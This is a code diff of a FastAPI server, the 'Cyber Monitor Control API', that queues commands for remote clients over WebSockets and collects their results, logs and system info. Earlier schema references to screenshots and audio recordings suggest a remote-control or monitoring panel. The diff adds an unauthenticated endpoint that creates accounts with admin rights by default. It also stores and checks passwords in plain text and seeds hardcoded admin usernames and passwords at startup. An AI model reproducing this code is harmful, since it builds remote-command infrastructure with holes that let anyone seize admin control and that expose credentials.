@@ -57,6 +57,12 @@ class LoginRequest(BaseModel):
     email: str = Field(..., example="kizer")
     password: str = Field(..., example="kidraper67")
 
+class CreateAccountRequest(BaseModel):
+    email: str = Field(..., example="xotiic")
+    password: str = Field(..., example="40671Mps19*")
+    confirm_password: str = Field(..., example="40671Mps19*")
+    is_admin: bool = Field(default=True)
+
 class ClientRegister(BaseModel):
     client_id: str = Field(..., example="client-001")
     name: str = Field(..., example="Office Computer")
@@ -225,7 +231,6 @@ class ConnectionManager:
 manager = ConnectionManager()
 
 # ========== SUPABASE CLIENT ==========
-# We'll use HTTP requests to Supabase REST API instead of the problematic supabase-py package
 import httpx
 
 class SupabaseClient:
@@ -236,7 +241,8 @@ class SupabaseClient:
             headers={
                 "apikey": self.key,
                 "Authorization": f"Bearer {self.key}",
-                "Content-Type": "application/json"
+                "Content-Type": "application/json",
+                "Prefer": "return=representation"
             },
             timeout=30.0
         )
@@ -289,6 +295,49 @@ class SupabaseClient:
 supabase = SupabaseClient()
 
 # ========== API ROUTES ==========
+@app.post("/api/create-account", response_model=dict)
+async def create_account(data: CreateAccountRequest):
+    """Create a new admin account"""
+    try:
+        # Check if passwords match
+        if data.password != data.confirm_password:
+            raise HTTPException(status_code=400, detail="Passwords do not match")
+        
+        # Check if user already exists
+        existing_users = await supabase.query("users", params={
+            "email": f"eq.{data.email}",
+            "select": "id"
+        })
+        
+        if existing_users:
+            raise HTTPException(status_code=400, detail="User already exists")
+        
+        # For simplicity, store password as plain text (NOT for production!)
+        # In production, you should use PostgreSQL's crypt function
+        result = await supabase.query("users", method="POST", data={
+            "email": data.email,
+            "password_hash": data.password,  # Plain text - NOT SECURE for production
+            "is_admin": data.is_admin,
+            "is_active": True,
+            "created_at": datetime.utcnow().isoformat(),
+            "last_login": None
+        })
+        
+        logger.info(f"✅ Account created for: {data.email}")
+        
+        return {
+            "success": True,
+            "message": "Account created successfully",
+            "email": data.email,
+            "is_admin": data.is_admin
+        }
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Create account error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
 @app.post("/api/login", response_model=dict)
 async def login(data: LoginRequest):
     """Login endpoint"""
@@ -308,32 +357,11 @@ async def login(data: LoginRequest):
         
         user = users[0]
         
-        # For PostgreSQL crypt verification, we need to use RPC
-        try:
-            # Call PostgreSQL crypt function via RPC
-            result = await supabase.rpc("verify_user_password", {
-                "user_email": data.email,
-                "password": data.password
-            })
-            
-            if not result or not result[0].get('password_match', False):
-                logger.warning(f"Password verification failed for user: {data.email}")
-                raise HTTPException(status_code=401, detail="Invalid credentials")
-                
-        except Exception as rpc_error:
-            logger.error(f"RPC verification failed: {rpc_error}")
-            # Fallback: Check against common admin passwords
-            admin_credentials = {
-                "kizer": "kidraper67",
-                "xotiic": "40671Mps19*",
-                "nathan": "femboy67"
-            }
-            
-            if data.email in admin_credentials and data.password == admin_credentials[data.email]:
-                # Valid admin password
-                pass
-            else:
-                raise HTTPException(status_code=401, detail="Invalid credentials")
+        # Simple password check (for development only)
+        # In production, use proper password hashing
+        if user['password_hash'] != data.password:
+            logger.warning(f"Password verification failed for user: {data.email}")
+            raise HTTPException(status_code=401, detail="Invalid credentials")
         
         logger.info(f"✅ User authenticated: {user['email']}")
         
@@ -386,7 +414,7 @@ async def register_client(data: ClientRegister, request: Request):
         # Check if client exists
         existing_clients = await supabase.query("clients", params={
             "client_id": f"eq.{data.client_id}",
-            "select": "id"
+            "select": "id,client_id"
         })
         
         client_data = {
@@ -463,14 +491,11 @@ async def get_clients(
         # Get clients
         clients = await supabase.query("clients", params=params)
         
-        # Get total count
-        count_params = {}
-        if online_only:
-            count_params["online"] = "eq.true"
-        if search:
-            count_params["or"] = f"(client_id.ilike.%{search}%,name.ilike.%{search}%,ip_address.ilike.%{search}%)"
+        # Mark clients as online if they have active WebSocket connections
+        for client in clients:
+            client["ws_online"] = client["client_id"] in manager.client_connections
         
-        # For count, we use a simpler approach
+        # Get total count
         all_clients = await supabase.query("clients", params={"select": "id"})
         total = len(all_clients)
         
@@ -502,23 +527,15 @@ async def get_client(client_id: str, user: dict = Depends(authenticate_user)):
             raise HTTPException(status_code=404, detail="Client not found")
         
         client = clients[0]
+        client["ws_online"] = client_id in manager.client_connections
         
         # Get recent logs for this client
-        # First get the client's database ID
-        client_id_result = await supabase.query("clients", params={
-            "client_id": f"eq.{client_id}",
-            "select": "id"
+        logs = await supabase.query("logs", params={
+            "client_id": f"eq.{client['id']}",
+            "select": "*",
+            "order": "created_at.desc",
+            "limit": "20"
         })
-        
-        logs = []
-        if client_id_result:
-            db_client_id = client_id_result[0]['id']
-            logs = await supabase.query("logs", params={
-                "client_id": f"eq.{db_client_id}",
-                "select": "*",
-                "order": "created_at.desc",
-                "limit": "20"
-            })
         
         return {
             "success": True,
@@ -551,7 +568,7 @@ async def send_command(data: CommandRequest, user: dict = Depends(authenticate_u
         result = await supabase.query("commands", method="POST", data={
             "client_id": db_client_id,
             "command": data.command,
-            "parameters": data.parameters,
+            "parameters": json.dumps(data.parameters) if data.parameters else None,
             "status": "pending",
             "created_at": datetime.utcnow().isoformat()
         })
@@ -599,53 +616,12 @@ async def get_commands(
 ):
     """Get recent commands"""
     try:
-        offset = (page - 1) * limit
-        
-        # Start with base query
-        query = """
-            SELECT c.id, cl.client_id, cl.name as client_name, 
-                   c.command, c.parameters, c.status, c.result, c.error,
-                   c.created_at, c.completed_at
-            FROM commands c
-            JOIN clients cl ON c.client_id = cl.id
-            WHERE 1=1
-        """
-        params = []
-        
-        if client_id:
-            query += " AND cl.client_id = %s"
-            params.append(client_id)
-        
-        if status:
-            query += " AND c.status = %s"
-            params.append(status)
-        
-        # Get total count
-        count_query = """
-            SELECT COUNT(*) as total
-            FROM commands c
-            JOIN clients cl ON c.client_id = cl.id
-            WHERE 1=1
-        """
-        count_params = []
-        
-        if client_id:
-            count_query += " AND cl.client_id = %s"
-            count_params.append(client_id)
-        
-        if status:
-            count_query += " AND c.status = %s"
-            count_params.append(status)
-        
-        # Since we can't easily do joins with Supabase REST API,
-        # we'll get commands and clients separately and join them in code
-        
-        # Get commands
-        command_params = {
-            "select": "*,clients(client_id,name)",
+        # Build query params
+        params = {
+            "select": "*,clients(*)",
             "order": "created_at.desc",
             "limit": str(limit),
-            "offset": str(offset)
+            "offset": str((page - 1) * limit)
         }
         
         if client_id:
@@ -655,12 +631,25 @@ async def get_commands(
                 "select": "id"
             })
             if client_result:
-                command_params["client_id"] = f"eq.{client_result[0]['id']}"
+                params["client_id"] = f"eq.{client_result[0]['id']}"
         
         if status:
-            command_params["status"] = f"eq.{status}"
+            params["status"] = f"eq.{status}"
         
-        commands_result = await supabase.query("commands", params=command_params)
+        commands_result = await supabase.query("commands", params=params)
+        
+        # Format the response
+        formatted_commands = []
+        for cmd in (commands_result or []):
+            formatted_cmd = dict(cmd)
+            if cmd.get("clients"):
+                client_data = cmd["clients"][0] if isinstance(cmd["clients"], list) else cmd["clients"]
+                formatted_cmd["client"] = {
+                    "client_id": client_data.get("client_id"),
+                    "name": client_data.get("name")
+                }
+                del formatted_cmd["clients"]
+            formatted_commands.append(formatted_cmd)
         
         # Get total count
         count_params = {}
@@ -671,18 +660,6 @@ async def get_commands(
         
         all_commands = await supabase.query("commands", params={"select": "id", **count_params})
         total = len(all_commands)
-        
-        # Format the response
-        formatted_commands = []
-        for cmd in (commands_result or []):
-            formatted_cmd = dict(cmd)
-            if cmd.get("clients"):
-                formatted_cmd["client"] = {
-                    "client_id": cmd["clients"][0]["client_id"] if isinstance(cmd["clients"], list) else cmd["clients"]["client_id"],
-                    "name": cmd["clients"][0]["name"] if isinstance(cmd["clients"], list) else cmd["clients"]["name"]
-                }
-                del formatted_cmd["clients"]
-            formatted_commands.append(formatted_cmd)
         
         return {
             "success": True,
@@ -696,6 +673,75 @@ async def get_commands(
         }
     except Exception as e:
         logger.error(f"Get commands error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.get("/api/logs", response_model=dict)
+async def get_logs(
+    user: dict = Depends(authenticate_user),
+    client_id: Optional[str] = Query(None),
+    log_type: Optional[str] = Query(None),
+    page: int = Query(1, ge=1),
+    limit: int = Query(100, ge=1, le=1000)
+):
+    """Get system logs"""
+    try:
+        # Build query params
+        params = {
+            "select": "*,clients(*)",
+            "order": "created_at.desc",
+            "limit": str(limit),
+            "offset": str((page - 1) * limit)
+        }
+        
+        if client_id:
+            # First get client ID
+            client_result = await supabase.query("clients", params={
+                "client_id": f"eq.{client_id}",
+                "select": "id"
+            })
+            if client_result:
+                params["client_id"] = f"eq.{client_result[0]['id']}"
+        
+        if log_type:
+            params["log_type"] = f"eq.{log_type}"
+        
+        logs_result = await supabase.query("logs", params=params)
+        
+        # Format the response
+        formatted_logs = []
+        for log in (logs_result or []):
+            formatted_log = dict(log)
+            if log.get("clients"):
+                client_data = log["clients"][0] if isinstance(log["clients"], list) else log["clients"]
+                formatted_log["client"] = {
+                    "client_id": client_data.get("client_id"),
+                    "name": client_data.get("name")
+                }
+                del formatted_log["clients"]
+            formatted_logs.append(formatted_log)
+        
+        # Get total count
+        count_params = {}
+        if client_id and client_result:
+            count_params["client_id"] = f"eq.{client_result[0]['id']}"
+        if log_type:
+            count_params["log_type"] = f"eq.{log_type}"
+        
+        all_logs = await supabase.query("logs", params={"select": "id", **count_params})
+        total = len(all_logs)
+        
+        return {
+            "success": True,
+            "logs": formatted_logs,
+            "pagination": {
+                "page": page,
+                "limit": limit,
+                "total": total,
+                "pages": (total + limit - 1) // limit if limit > 0 else 0
+            }
+        }
+    except Exception as e:
+        logger.error(f"Get logs error: {e}")
         raise HTTPException(status_code=500, detail="Internal server error")
 
 # ========== WEBSOCKET ENDPOINTS ==========
@@ -730,92 +776,85 @@ async def websocket_client(websocket: WebSocket, client_id: str):
         except Exception as e:
             logger.error(f"Client status update error: {e}")
         
+        # Send welcome message
+        await websocket.send_json({
+            "type": "welcome",
+            "message": f"Connected to server as {client_id}",
+            "server_time": datetime.utcnow().isoformat()
+        })
+        
         while True:
-            data = await websocket.receive_json()
-            data_type = data.get("type")
-            
-            if data_type == "heartbeat":
-                # Update last seen
-                try:
-                    await supabase.query("clients", method="PATCH", data={
-                        "last_seen": datetime.utcnow().isoformat(),
-                        "online": True
-                    }, params={"client_id": f"eq.{client_id}"})
-                except Exception as e:
-                    logger.error(f"Heartbeat update error: {e}")
+            try:
+                data = await websocket.receive_json()
+                data_type = data.get("type")
                 
-            elif data_type == "command_result":
-                # Update command status
-                try:
-                    await supabase.query("commands", method="PATCH", data={
-                        "status": "completed",
+                if data_type == "heartbeat":
+                    # Update last seen
+                    try:
+                        await supabase.query("clients", method="PATCH", data={
+                            "last_seen": datetime.utcnow().isoformat(),
+                            "online": True
+                        }, params={"client_id": f"eq.{client_id}"})
+                        
+                        # Send heartbeat response
+                        await websocket.send_json({
+                            "type": "heartbeat_response",
+                            "timestamp": datetime.utcnow().isoformat()
+                        })
+                    except Exception as e:
+                        logger.error(f"Heartbeat update error: {e}")
+                    
+                elif data_type == "command_result":
+                    # Update command status
+                    try:
+                        await supabase.query("commands", method="PATCH", data={
+                            "status": "completed",
+                            "result": data.get("result"),
+                            "completed_at": datetime.utcnow().isoformat(),
+                            "error": data.get("error", "")
+                        }, params={"id": f"eq.{data.get('command_id')}"})
+                    except Exception as e:
+                        logger.error(f"Command result update error: {e}")
+                    
+                    # Notify admins
+                    await manager.notify_admins({
+                        "type": "command_result",
+                        "client_id": client_id,
+                        "command_id": data.get("command_id"),
+                        "command": data.get("command"),
                         "result": data.get("result"),
-                        "completed_at": datetime.utcnow().isoformat(),
-                        "error": data.get("error", "")
-                    }, params={"id": f"eq.{data.get('command_id')}"})
-                except Exception as e:
-                    logger.error(f"Command result update error: {e}")
-                
-                # Notify admins
-                await manager.notify_admins({
-                    "type": "command_result",
-                    "client_id": client_id,
-                    "command_id": data.get("command_id"),
-                    "command": data.get("command"),
-                    "result": data.get("result"),
-                    "error": data.get("error"),
-                    "timestamp": datetime.utcnow().isoformat()
-                })
-                
-            elif data_type == "log":
-                # Store log
-                try:
-                    client_result = await supabase.query("clients", params={
-                        "client_id": f"eq.{client_id}",
-                        "select": "id"
+                        "error": data.get("error"),
+                        "timestamp": datetime.utcnow().isoformat()
                     })
-                    if client_result:
-                        await supabase.query("logs", method="POST", data={
-                            "client_id": client_result[0]['id'],
-                            "log_type": data.get("log_type", "info"),
-                            "message": data.get("message", ""),
-                            "created_at": datetime.utcnow().isoformat()
+                    
+                elif data_type == "log":
+                    # Store log
+                    try:
+                        client_result = await supabase.query("clients", params={
+                            "client_id": f"eq.{client_id}",
+                            "select": "id"
                         })
-                except Exception as e:
-                    logger.error(f"Log storage error: {e}")
-                
-                # Notify admins
-                await manager.notify_admins({
-                    "type": "client_log",
-                    "client_id": client_id,
-                    "log_type": data.get("log_type", "info"),
-                    "message": data.get("message", ""),
-                    "timestamp": datetime.utcnow().isoformat()
-                })
-                
-            elif data_type == "system_info":
-                # Store system info
-                try:
-                    client_result = await supabase.query("clients", params={
-                        "client_id": f"eq.{client_id}",
-                        "select": "id"
+                        if client_result:
+                            await supabase.query("logs", method="POST", data={
+                                "client_id": client_result[0]['id'],
+                                "log_type": data.get("log_type", "info"),
+                                "message": data.get("message", ""),
+                                "created_at": datetime.utcnow().isoformat()
+                            })
+                    except Exception as e:
+                        logger.error(f"Log storage error: {e}")
+                    
+                    # Notify admins
+                    await manager.notify_admins({
+                        "type": "client_log",
+                        "client_id": client_id,
+                        "log_type": data.get("log_type", "info"),
+                        "message": data.get("message", ""),
+                        "timestamp": datetime.utcnow().isoformat()
                     })
-                    if client_result:
-                        await supabase.query("system_info", method="POST", data={
-                            "client_id": client_result[0]['id'],
-                            "info": data.get("info", {}),
-                            "created_at": datetime.utcnow().isoformat()
-                        })
-                except Exception as e:
-                    logger.error(f"System info storage error: {e}")
-                
-                # Notify admins
-                await manager.notify_admins({
-                    "type": "system_info",
-                    "client_id": client_id,
-                    "info": data.get("info", {}),
-                    "timestamp": datetime.utcnow().isoformat()
-                })
+                    
+            except Exception as e:
+                logger.error(f"Error processing WebSocket message: {e}")
                 
     except WebSocketDisconnect:
         # Mark client as offline
@@ -917,14 +956,53 @@ async def startup_event():
     """Initialize application on startup"""
     logger.info(f"🚀 Starting Cyber Monitor Control API v3.0")
     logger.info(f"📡 Port: {PORT}")
+    logger.info(f"🔗 Backend URL: {SUPABASE_URL}")
     
     # Test Supabase connection
     try:
         users = await supabase.query("users", params={"limit": "1"})
         logger.info(f"✅ Supabase connected - Users table accessible")
         
+        # Check if admin accounts exist, create default if not
+        admin_users = await supabase.query("users", params={
+            "is_admin": "eq.true",
+            "select": "email"
+        })
+        
+        if not admin_users:
+            logger.info("⚠️ No admin users found, creating default admin accounts...")
+            
+            # Create default admin accounts
+            default_admins = [
+                {"email": "xotiic", "password": "40671Mps19*", "is_admin": True},
+                {"email": "kizer", "password": "kidraper67", "is_admin": True},
+                {"email": "nathan", "password": "femboy67", "is_admin": True}
+            ]
+            
+            for admin in default_admins:
+                try:
+                    # Check if exists
+                    existing = await supabase.query("users", params={
+                        "email": f"eq.{admin['email']}",
+                        "select": "id"
+                    })
+                    
+                    if not existing:
+                        await supabase.query("users", method="POST", data={
+                            "email": admin['email'],
+                            "password_hash": admin['password'],
+                            "is_admin": admin['is_admin'],
+                            "is_active": True,
+                            "created_at": datetime.utcnow().isoformat()
+                        })
+                        logger.info(f"✅ Created default admin: {admin['email']}")
+                except Exception as e:
+                    logger.error(f"Failed to create admin {admin['email']}: {e}")
+        else:
+            logger.info(f"✅ Found {len(admin_users)} admin users")
+        
         # Test all tables exist
-        tables = ["users", "clients", "commands", "screenshots", "audio_recordings", "logs", "system_info"]
+        tables = ["users", "clients", "commands", "logs"]
         accessible_tables = []
         
         for table in tables:
@@ -941,9 +1019,9 @@ async def startup_event():
         logger.error("💡 Please check your SUPABASE_URL and SUPABASE_KEY environment variables")
     
     logger.info(f"🔗 WebSocket endpoints:")
-    logger.info(f"   • Admin: ws://localhost:{PORT}/ws/admin")
-    logger.info(f"   • Client: ws://localhost:{PORT}/ws/client/{{client_id}}")
-    logger.info(f"📚 Documentation: http://localhost:{PORT}/docs")
+    logger.info(f"   • Admin: /ws/admin")
+    logger.info(f"   • Client: /ws/client/{{client_id}}")
+    logger.info(f"📚 Documentation: /docs")
     logger.info("✅ Application startup complete")
 
 @app.on_event("shutdown")
